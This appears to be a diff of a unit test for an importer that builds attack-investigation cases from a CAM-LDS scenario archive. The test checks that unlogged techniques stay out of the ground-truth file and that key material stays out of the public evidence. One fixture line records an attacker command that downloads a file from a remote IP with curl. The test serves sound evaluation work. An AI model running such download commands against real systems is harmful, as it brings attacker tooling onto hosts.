@@ -48,6 +48,12 @@ class CamLdsImporterTests(unittest.TestCase):
                     'cmd': 'curl http://192.42.1.174/donotcry',
                     'parameters': {'session': 'movement', 'metadata': {'techniques': 'T1105'}},
                 },
+                {
+                    'start-datetime': '2025-12-12T10:47:20.000000',
+                    'type': 'msf-session',
+                    'cmd': 'unlogged_custom_binary_xyz',
+                    'parameters': {'session': 'movement', 'metadata': {'techniques': 'T1059.004'}},
+                },
             ]
             zf.writestr(
                 'scenario_3_ssh_apt/attacker/attackmate.json',
@@ -83,6 +89,8 @@ class CamLdsImporterTests(unittest.TestCase):
             rep_apt = import_camlds_case(zp, root / 'apt_out', ioc_regime='novel_apt_zero_ioc')
             self.assertEqual(rep_apt['sophistication_band'], 'S4')
             self.assertGreaterEqual(rep_apt['steps'], 3)
+            apt_truth = load_json(Path(rep_apt['case_dir']) / 'evaluator' / 'truth.json')
+            self.assertNotIn('T1059.004', {s['technique_id'] for s in apt_truth['steps']})
             pub_text = (Path(rep_apt['case_dir']) / 'public' / 'evidence.json').read_text(encoding='utf-8')
             self.assertNotIn('SECRET_KEY_MATERIAL', pub_text)
             self.assertNotIn('OPENSSH PRIVATE KEY', pub_text)
